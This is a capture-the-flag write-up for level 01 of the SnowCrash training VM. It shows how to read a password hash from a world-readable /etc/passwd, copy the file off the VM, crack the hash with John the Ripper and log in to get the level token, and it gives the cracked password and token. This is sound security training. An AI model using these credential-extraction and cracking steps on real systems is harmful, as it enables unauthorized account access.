# Level 01

## Vulnerability

Password stored in publicly readable file, weak encryption

## Context

Nothing in the home folder, but for some reason we have read rights on /etc/passwd...
```
level01@SnowCrash:~$ ls -l /etc/ | grep 'passwd'
-rw-r--r-- 1 root root    2477 Mar  5  2016 passwd
```

## Solution

/etc/passwd stores user account details. Let's look for the password for user ```flag01```. 
Note: [the second field](https://www.cyberciti.biz/faq/understanding-etcpasswd-file-format/) is the password.
```
level01@SnowCrash:~$ grep 'flag01' /etc/passwd
flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash

level01@SnowCrash:~$ grep 'flag01' /etc/passwd | cut -d ':' -f 2
42hDRfypTqqnw
```

Copy the password to your home machine (outside of the VM). 
```
>$ scp -P4242 level01@{VM_IP}:/etc/passwd vm_passwd
```

Cut out user flag01's password and save in a new file. 
```
>$ grep 'flag01' vm_passwd | cut -d ':' -f 2 >> password
```

Next, install JohnTheRipper (a popular password cracker) and run on the password. 
```
>$ git clone https://www.github.com/magnumripper/JohnTheRipper john
>$ cd john/src
>$ ./configure LDFLAGS=-L$HOME/.brew/opt/openssl/lib CPPFLAGS=-I$HOME/.brew/opt/openssl/include
>$ make -s clean && make -sj4
>$ cd ../run
>$ ./john ../../password
...
abcdefg
```

Let's try to log in to user flag01...
```
level01@SnowCrash:~$ su flag01
Password: abcdefg
```

Run getflag!
```
flag01@SnowCrash:~$ getflag
Check flag.Here is your token : f2av5il02puano7naaf6adaaf
```
